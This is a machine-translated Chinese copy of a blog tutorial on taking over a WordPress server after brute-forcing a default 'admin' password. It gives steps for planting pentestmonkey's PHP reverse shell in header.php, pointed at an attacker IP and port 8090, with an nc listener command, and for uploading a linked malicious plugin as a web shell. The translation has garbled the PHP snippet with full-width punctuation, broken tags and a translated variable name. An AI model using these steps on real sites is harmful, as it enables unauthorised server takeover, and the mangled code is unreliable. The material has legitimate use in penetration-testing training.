> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [rioasmara.com](https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/)

> 大家好，我想继续我们的最后一次尝试，我们试图渗透到wordpress应用中……

[跳到内容](#content)

大家好，

我想继续我们的最后一个练习，我们尝试渗透到wordpress应用程序中。

我们进行了蛮横的努力，最终找到了一个有效的管理员密码“ admin”。服务器管理员将wordpress安装保留为默认设置，这是一个非常致命的错误。

进入wordpress之后，下一步该怎么做？您可能要做的最好的事情是安装反向外壳程序或将Web外壳程序上载到服务器，以便在服务器中进行更好的导航。我会在这篇文章中解释两者

**反壳**

反向外壳程序是一种机制，通过利用Web服务器触发连接回CnC服务器的方式，您可以拥有服务器外壳程序。在CnC服务器上，将创建一个侦听服务器，以等待来自服务器的连接。

好处

1.  像SSH一样，它可以让您完全控制服务器外壳
2.  允许您在服务器上进行进一步的枚举

缺点

1.  如果您需要分析数据库，那么在控制台中进行操作将非常繁琐
2.  如果您没有IP，应用程序服务器可以到达CnC服务器，那么做反向Shell非常困难
3.   由于Web服务器将触发TCP连接返回到CnC，因此更容易成为防火墙的目标

**网页外壳**

Web Shell是一种我们上传文件成为后门的方法，它为您提供一些管理Web服务器的功能，例如文件编辑器，文件浏览器，SQL数据库浏览器等，并且取决于后门的成熟度

好处

1.  在服务器上轻松导航和文件处理
2.  GUI .. GUI .. GUI
3.  由于这是正常的HTTP请求，因此很难检测，并且如果将其封装在HTTPS中，则中间安全设备甚至更难检测到
4.  易于编辑某些文件

缺点

1.  进行进一步枚举的灵活性较差

好的，现在让我们开始做反向shell。

1.  登录到WordPress
2.  转到外观–>编辑器  
    ![](https://rioasmara.files.wordpress.com/2019/02/22.png?w=840)
3.  在右侧，您可以选择header.php
4.  您可以将所有header.php的代码更改为php反向shell代码。我从pentestmonkey [http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)获得了它[](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)
5.  在将header.php代码更改为已下载文件中的php代码之后，不要忘记更改**$ ip**和**$ port**使其指向您的主机，如下所示
    
    ```
    <？php
     
    set_time_limit（0）;
    $ VERSION = “ 1.0” ;
    $ ip = <strong> '192.168.5.200' </ strong>; //更改此
    $ port = <strong> 8090 ; </ strong> //更改此
    $ chunk_size = 1400 ;
    $ write_a = null ;
    $ error_a = null ;
    $ shell = 'uname -a; w; ID; / bin / sh -i' ;
    $ daemon = 0 ;
    $调试= 0 ;
    ```
    
6.  新闻更新文件  
    ![](https://rioasmara.files.wordpress.com/2019/02/23.png?w=840)
7.  您需要在端口8090上启动侦听服务器，以使用如下命令从服务器接受反向连接：**nc -nlvp 8090**
8.  这里有反向外壳

[![](https://asciinema.org/a/229539.svg)](https://asciinema.org/a/229539)

上面的步骤是设置反向外壳程序，该外壳程序允许服务器创建回主机的连接

让我们开始上传webshel​​l。

1.  登录到WordPress
2.  转到pluggin并安装一个新的pluggin  
    ![](https://rioasmara.files.wordpress.com/2019/02/24.png?w=840)
3.  在此之前，您可以从[https://github.com/wetw0rk/malicious-wordpress-plugin.git](https://github.com/wetw0rk/malicious-wordpress-plugin.git)下载该插件。[](https://github.com/wetw0rk/malicious-wordpress-plugin.git)
4.  您可以通过将插件zip上传到wordpress来添加新插件  
    ![](https://rioasmara.files.wordpress.com/2019/02/25.png?w=840)
5.  然后按立即安装
6.  成功安装后，您可以在列表中看到您的插件  
    ![](https://rioasmara.files.wordpress.com/2019/02/26.png?w=840)
7.  现在，您可以使用Webshel​​l的完整路径来访问Webshel​​l。在我的wordpress路径中，我可以使用以下路径访问文件：[http://192.168.5.193/wordpress/wp-content/plugins/wp-shell-plugin-master/wp-shell-plugin.php](http://192.168.5.193/wordpress/wp-content/plugins/wp-shell-plugin-master/wp-shell-plugin.php)  
    ![](https://rioasmara.files.wordpress.com/2019/02/27.png?w=840)
8.  如上所述，您可以看到该Web外壳已打开。您可以使用该Web浏览和浏览服务器中的某些文件。

现在，您已经可以通过Web和反向tcp来完成Shell了。渗透测试人员必须具备的一项关键技能，因为它将使接管服务器的过程变得更容易，从而使结果更快。